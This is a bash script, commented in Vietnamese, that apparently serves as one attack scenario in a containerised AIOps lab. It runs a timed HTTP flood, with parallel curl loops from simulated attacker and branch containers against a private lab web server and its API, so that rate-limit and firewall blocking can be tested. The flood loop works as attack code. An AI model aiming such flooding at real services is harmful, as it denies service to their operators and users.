#!/usr/bin/env bash
# =============================================================================
# Kịch bản 06: Quá tải ứng dụng HTTP Flood (Application Layer 7 DoS)
# Mục đích: Bắn dồn dập hàng ngàn HTTP request vào Web Portal và Flask API
# Nguồn: internet-attacker (Internet) & branch-client (Chi nhánh)
# Đích: service-server (192.168.10.10:80) và API backend
# Hiệu ứng: Nginx connections spike, API latency tăng, CPU server tăng cao
# Điểm chặn tự động: Nginx Rate-Limit hoặc Firewall IP Block
# Công cụ: Multi-process curl parallel flood
# =============================================================================
set -euo pipefail

DURATION="${1:-60}"
P="clab-aiops-prod"

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [START] Kịch bản 06: Server HTTP Flood (Thời lượng: ${DURATION}s)..."

cleanup() {
  echo
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] [CLEANUP] Dừng HTTP flood..."
  docker exec "$P-internet-attacker" killall curl 2>/dev/null || true
  docker exec "$P-branch-client" killall curl 2>/dev/null || true
}
trap cleanup INT TERM EXIT

# Hàm bắn tải liên tục từ container
flood_worker() {
  local container="$1"
  docker exec "$container" sh -c "
    STOP_TIME=\$((\$(date +%s) + $DURATION))
    while [ \$(date +%s) -lt \$STOP_TIME ]; do
      for i in \$(seq 1 20); do
        curl -sf -m2 'http://192.168.10.10/' >/dev/null 2>&1 &
        curl -sf -m2 'http://192.168.10.10/api/search?q=Nhan' >/dev/null 2>&1 &
        curl -sf -m2 'http://192.168.10.10/api/employees' >/dev/null 2>&1 &
      done
      wait
    done
  " &
}

echo "  [+] Bắt đầu bắn HTTP flood đồng thời từ internet-attacker và branch-client..."
flood_worker "$P-internet-attacker"
PID_ATK=$!
flood_worker "$P-branch-client"
PID_BR=$!

ELAPSED=0
while [ "$ELAPSED" -lt "$DURATION" ]; do
  sleep 2
  ELAPSED=$((ELAPSED + 2))
done

kill "$PID_ATK" "$PID_BR" 2>/dev/null || true
wait "$PID_ATK" "$PID_BR" 2>/dev/null || true
cleanup

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [END] Kịch bản 06: Server HTTP Flood hoàn thành."
